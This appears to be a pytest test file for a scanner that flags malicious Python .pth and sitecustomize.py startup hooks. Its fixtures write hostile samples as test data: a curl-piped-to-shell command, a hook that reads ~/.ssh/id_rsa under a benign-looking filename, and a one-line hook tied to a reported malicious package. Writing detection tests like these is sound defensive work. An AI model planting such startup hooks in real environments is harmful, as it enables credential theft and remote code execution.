from __future__ import annotations

import json
from pathlib import Path

from pthguard.cli import main
from pthguard.iocs import load_iocs
from pthguard.models import Severity
from pthguard.scanner import scan_site_dir


def test_sibling_stealer_is_critical(evil_site: Path) -> None:
    (rep,) = [r for r in scan_site_dir(evil_site, load_iocs()) if r.path.endswith("cook.pth")]
    rules = {f.rule for f in rep.findings}
    assert rep.severity == Severity.CRITICAL
    assert {"PTH-SIBLING", "PTH-STEALER", "PTH-BACKDOOR", "PTH-ORPHAN"} <= rules


def test_plain_path_pth_is_clean(tmp_path: Path) -> None:
    (tmp_path / "paths.pth").write_text("# comment\n/opt/lib\n")
    (rep,) = scan_site_dir(tmp_path, load_iocs())
    assert rep.severity <= Severity.LOW  # only the orphan note


def test_tmp_path_entry_flagged(tmp_path: Path) -> None:
    (tmp_path / "x.pth").write_text("/tmp/evil\n")
    (rep,) = scan_site_dir(tmp_path, load_iocs())
    assert any(f.rule == "PTH-PATH" for f in rep.findings)


def test_sitecustomize_analyzed(tmp_path: Path) -> None:
    (tmp_path / "sitecustomize.py").write_text("import os\nos.system('curl x | sh')\n")
    (rep,) = scan_site_dir(tmp_path, load_iocs())
    assert any(f.rule == "PTH-PROC" for f in rep.findings)


def test_known_benign_distutils_hook_downgraded(tmp_path: Path) -> None:
    (tmp_path / "distutils-precedence.pth").write_text(
        "import os; var = 'SETUPTOOLS_USE_DISTUTILS'; "
        "enabled = os.environ.get(var, 'local') == 'local'; "
        "enabled and __import__('_distutils_hack').add_shim();\n"
    )
    (rep,) = scan_site_dir(tmp_path, load_iocs())
    assert rep.severity <= Severity.LOW


def test_benign_name_cannot_hide_stealer(tmp_path: Path) -> None:
    (tmp_path / "distutils-precedence.pth").write_text("import os, socket; open(os.path.expanduser('~/.ssh/id_rsa'))\n")
    (rep,) = scan_site_dir(tmp_path, load_iocs())
    assert rep.severity >= Severity.HIGH


def test_owner_mapped_from_record(tmp_path: Path) -> None:
    di = tmp_path / "foo-1.0.dist-info"
    di.mkdir()
    (di / "RECORD").write_text("foo.pth,sha256=x,1\n")
    (tmp_path / "foo.pth").write_text("/opt/x\n")
    (rep,) = scan_site_dir(tmp_path, load_iocs())
    assert rep.owner == "foo-1.0"
    assert all(f.rule != "PTH-ORPHAN" for f in rep.findings)


def test_ioc_hash_and_string(tmp_path: Path, custom_iocs: Path) -> None:
    (tmp_path / "a.pth").write_text("import cook; cook.go()\n")
    (tmp_path / "b.pth").write_text("# needle-xyz\n")
    reps = {Path(r.path).name: r for r in scan_site_dir(tmp_path, load_iocs(custom_iocs))}
    assert any(f.rule == "IOC-HASH" for f in reps["a.pth"].findings)
    assert any(f.rule == "IOC-STRING" for f in reps["b.pth"].findings)


def test_cli_exit_codes_and_json(evil_site: Path, tmp_path: Path, capsys) -> None:  # type: ignore[no-untyped-def]
    args = ["scan", "--no-default", "--no-host-markers", "--path", str(evil_site)]
    assert main([*args, "--format", "json"]) == 1
    doc = json.loads(capsys.readouterr().out)
    assert doc["hooks"][0]["severity"] == "CRITICAL"
    assert main([*args, "--fail-on", "none"]) == 0
    clean = tmp_path / "clean"
    clean.mkdir()
    assert main(["scan", "--no-default", "--no-host-markers", "--path", str(clean)]) == 0


def test_cli_errors(tmp_path: Path, capsys) -> None:  # type: ignore[no-untyped-def]
    assert main(["check", str(tmp_path / "missing.whl")]) == 2
    assert "no such file" in capsys.readouterr().err
    assert main(["scan", "--no-default", "--path", str(tmp_path / "nodir")]) == 2


def test_sarif_valid_shape(evil_site: Path, capsys) -> None:  # type: ignore[no-untyped-def]
    main(["scan", "--no-default", "--no-host-markers", "--path", str(evil_site), "--format", "sarif"])
    doc = json.loads(capsys.readouterr().out)
    assert doc["version"] == "2.1.0"
    assert any(r["level"] == "error" for r in doc["runs"][0]["results"])


def test_venv_root_discovery(tmp_path: Path) -> None:
    sp = tmp_path / "proj" / ".venv" / "lib" / "python3.12" / "site-packages"
    sp.mkdir(parents=True)
    (tmp_path / "proj" / ".venv" / "pyvenv.cfg").write_text("home = /usr\n")
    (sp / "sitecustomize.py").write_text("import urllib.request\nimport os\nos.fork()\n")
    from pthguard.discovery import find_venv_site_dirs

    assert find_venv_site_dirs(tmp_path) == [sp]


def test_builtin_ioc_matches_litellm_cook_pth(tmp_path: Path) -> None:
    # the real malicious cook.pth is exactly this one line (sha256 7f1916...b92bdb)
    (tmp_path / "cook.pth").write_bytes(b"import cook\n")
    (rep,) = scan_site_dir(tmp_path, load_iocs())
    assert any(f.rule == "IOC-HASH" for f in rep.findings)
